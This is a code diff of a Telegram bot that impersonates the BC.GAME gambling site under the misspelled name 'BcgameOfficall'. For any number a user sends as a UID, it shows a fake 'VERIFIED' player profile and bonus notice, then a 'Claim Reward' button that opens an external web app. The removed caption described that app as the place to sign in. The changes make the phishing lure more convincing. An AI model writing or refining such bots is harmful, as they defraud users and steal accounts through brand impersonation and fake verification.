@@ -12,14 +12,13 @@ const uidImg = `${webUrl}uid_image.jpg`;
 bot.start(async (ctx) => {
     try {
         await ctx.replyWithPhoto(startImg, {
-            caption: `<b>Welcome to BC.GAME</b>\n\nTo continue, please provide your BC.GAME User ID (UID) to verify your account.`,
-            parse_mode: 'HTML',
+            caption: `Welcome to BcgameOfficall.\n\nSend your BC.Game UID to verify your VIP status and claim your bonus.`,
             ...Markup.inlineKeyboard([
                 [Markup.button.url('Join Channel', 'https://t.me/bcgame_official')]
             ])
         });
     } catch (e) {
-        ctx.reply('Welcome! Please enter your User ID to continue.');
+        ctx.reply('Welcome to BcgameOfficall.\n\nSend your BC.Game UID to verify your VIP status and claim your bonus.');
     }
 });
 
@@ -28,9 +27,20 @@ bot.on('text', async (ctx) => {
     
     if (/^\d+$/.test(text)) {
         try {
+            const profileText = `BC GAME PLAYER PROFILE
+━━━━━━━━━━━━━━━━━━━━
+👤 Name  : gammaophq
+🆔 UID   : ${text}
+🥇 Rank  : Beginner
+━━━━━━━━━━━━━━━━━━━━
+BONUS DETAILS
+━━━━━━━━━━━━━━━━━━━━
+🎁 ENGINE REWARDS
+📌 Status : ✅ VERIFIED
+— Claim is available`;
+
             await ctx.replyWithPhoto(uidImg, {
-                caption: `<b>UID Verified: ${text}</b>\n\nYou are now eligible to claim your reward. Click the button below to sign in and claim.`,
-                parse_mode: 'HTML',
+                caption: profileText,
                 ...Markup.inlineKeyboard([
                     [Markup.button.webApp('Claim Reward', webUrl)]
                 ])
